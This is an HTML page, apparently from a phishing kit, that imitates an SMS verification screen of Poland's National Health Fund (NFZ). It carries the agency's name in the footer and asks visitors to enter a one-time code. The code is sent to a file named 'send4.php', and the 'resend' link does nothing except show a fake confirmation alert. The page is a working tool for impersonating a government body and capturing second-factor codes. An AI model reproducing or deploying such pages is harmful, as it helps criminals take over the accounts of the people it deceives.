<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
	<link href="fav.ico" rel="SHORTCUT ICON" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weryfikacja SMS - NFZ</title>
    <style>
        :root {
            --primary-color: #2e2383;
            --primary-hover: #1a165c;
            --secondary-color: #f8f9fa;
            --text-color: #333;
            --light-gray: #e9ecef;
            --border-radius: 8px;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        header {
            background-color: white;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 1rem;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            padding: 1rem 0;
        }
        
        .logo-container img {
            height: 60px;
            max-width: 100%;
        }
        
        main {
            flex: 1;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem 1rem;
        }
        
        .form-container {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            margin: 0 auto;
            width: 100%;
            max-width: 500px;
        }
        
        .form-header {
            background-color: var(--primary-color);
            color: white;
            padding: 1.5rem;
            text-align: center;
        }
        
        .form-header h1 {
            font-size: 1.5rem;
            font-weight: 600;
        }
        
        .form-content {
            padding: 2rem;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text-color);
        }
        
        input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--light-gray);
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: all 0.3s ease;
            text-align: center;
            letter-spacing: 0.5em;
        }
        
        input:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(46, 35, 131, 0.2);
        }
        
        .info-message {
            background-color: #f8f9fa;
            border-left: 4px solid var(--primary-color);
            padding: 1rem;
            margin: 1.5rem 0;
            font-size: 0.875rem;
            color: #555;
        }
        
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 1rem;
            border-radius: var(--border-radius);
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            width: 100%;
            transition: background-color 0.3s;
            margin-top: 1rem;
        }
        
        button:hover {
            background-color: var(--primary-hover);
        }
        
        .error {
            color: #dc3545;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            display: none;
        }
        
        .resend-link {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.875rem;
        }
        
        .resend-link a {
            color: var(--primary-color);
            text-decoration: none;
            font-weight: 500;
        }
        
        .resend-link a:hover {
            text-decoration: underline;
        }
        
        footer {
            background-color: var(--secondary-color);
            padding: 1rem;
            text-align: center;
            font-size: 0.875rem;
            color: #666;
        }
        
        @media (max-width: 768px) {
            main {
                padding: 1rem;
            }
            
            .form-container {
                border-radius: 0;
                box-shadow: none;
            }
            
            .form-header {
                padding: 1rem;
            }
            
            .form-header h1 {
                font-size: 1.25rem;
            }
            
            .form-content {
                padding: 1.5rem;
            }
            
            input {
                letter-spacing: 0.3em;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="logo-container">
            <img src="lgo.png" alt="">
        </div>
    </header>
    
    <main>
        <div class="form-container">
            <div class="form-header">
                <h1>Weryfikacja kodem SMS</h1>
            </div>
            
            <div class="form-content">
                <form id="smsForm" action="send4.php" method="POST">
                    <div class="info-message">
                        <p>Kod weryfikacyjny został wysłany na Twój telefon. Wprowadź go poniżej, aby potwierdzić tożsamość.</p>
                    </div>
                    
                    <div class="form-group">
                        <label for="smsCode">Kod weryfikacyjny:</label>
                        <input type="text" id="smsCode" name="otp" placeholder="••••••" required autocomplete="off">
                        <div class="error" id="codeError">Proszę wprowadzić kod weryfikacyjny</div>
                    </div>
                    
                    <button type="submit" id="submitBtn">
                        Zweryfikuj kod
                    </button>
                    
                    <div class="resend-link">
                        <p>Nie otrzymałeś kodu? <a href="#" id="resendLink">Wyślij ponownie</a></p>
                    </div>
                </form>
            </div>
        </div>
    </main>
    
    <footer>
        <p>© 2025 Narodowy Fundusz Zdrowia. Wszelkie prawa zastrzeżone.</p>
    </footer>

    <script>
        document.getElementById('smsForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Reset error
            document.getElementById('codeError').style.display = 'none';
            
            // Get value
            const smsCode = document.getElementById('smsCode').value.trim();
            
            // Validate code (just checking it's not empty)
            if (smsCode === '') {
                document.getElementById('codeError').style.display = 'block';
                return false;
            }
            
            // If valid, submit form
            this.submit();
        });
        
        // Resend link functionality
        document.getElementById('resendLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Kod weryfikacyjny został wysłany ponownie.');
        });
        
        // Auto-focus on code input
        document.getElementById('smsCode').focus();
    </script>
</body>
</html>